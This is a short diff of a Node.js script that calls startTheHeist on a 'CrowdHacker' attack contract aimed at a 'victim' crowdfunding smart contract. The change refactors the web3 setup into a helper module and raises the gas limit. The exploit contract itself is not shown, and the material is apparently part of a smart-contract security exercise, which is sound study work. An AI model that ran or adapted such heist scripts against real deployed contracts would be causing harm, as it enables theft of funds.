@@ -1,27 +1,11 @@
-fs = require('fs');
-Web3 = require('web3');
-web3 = new Web3()
+contract = new require('../contract')('CrowdHacker')
 
-config = require('config')
-
-crowdfundAddr = config.get('contract_address')
-hackerAddr = config.get('hacker_address')
-endpoint = config.get('http_provider')
-
-contractName = "CrowdHacker"
-console.log("Contract name: " + contractName);
-
-web3.setProvider(new web3.providers.HttpProvider(endpoint));
-
-code = fs.readFileSync(`contracts/${contractName}.bin`).toString()
-abi = JSON.parse(fs.readFileSync(`contracts/${contractName}.abi`).toString())
-
-instance = web3.eth.contract(abi).at(hackerAddr)
-
-console.log("Victim: " + instance.victim());
-
-instance.startTheHeist(
+func = (instance) => {
+  instance.startTheHeist(
    {
        from: web3.eth.coinbase,
-       gas: 70000
-   });
+       gas: 150000
+   })
+}
+
+contract.runFunc(func)
